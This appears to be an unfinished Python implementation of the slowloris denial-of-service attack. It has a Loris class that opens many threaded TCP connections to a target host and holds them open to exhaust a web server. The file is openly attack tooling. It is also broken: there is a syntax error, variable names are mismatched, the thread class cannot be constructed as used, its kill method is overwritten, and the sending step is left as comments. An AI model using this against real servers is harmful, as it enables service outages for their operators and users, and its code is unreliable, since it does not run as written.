import socket
import threading
import time

"""
An implementation of the slowloris DDoS attack (as written by
RSnake).

Put the rest of the explanation here
"""

class Loris:
	def __init__(self, addr, port = 80, timeout = 5, totalConnections = 50):
		self.addr = addr
		self.port = port
		self.timeout = timeout
		self.totalConnections = totalConnections

		self.threadList = []
		self.connectionsPerThread = 10

	def initiateAttack(self):
		i = 0
		while i < totalConnections
			t = KillableThread(target = self.doConnections)
			t.start()
			self.threadList.append(t)
			i += self.totalConnections

	def endAttack(self):
		for t in self.threadList:
			t.kill()

	def doConnections(self):
		connections = [False] * self.connectionsPerThread
		sockets     = [None]  * self.connectionsPerThread

		while (True):
			if self.killed():
				return

			""" Establish connections """
			for i in range(0, self.connectionsPerThread):
				if connections[i] is False:
					sock[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock[i].connect((self.addr, self.port))
					# make sure that this is legit
					# finish connecting and all that nonsense

			""" Send data """
			for i in range(0, self.connectionsPerThread):
				if connections[i] is True:
					if sockets[i]:
						sock = sock[i]
						# send data over sock
						# if success, connections[i] = True
						# else connections[i] = False

			""" Sleep for timeout """
			time.sleep(self.timeout)

class KillableThread(threading.Thread):

	def __init__(self):
		super(KillableThread, self).__init__()
		self.kill = threading.Event()

	def kill(self):
		self.kill.set()

	def killed(self):
		return self.kill.isSet()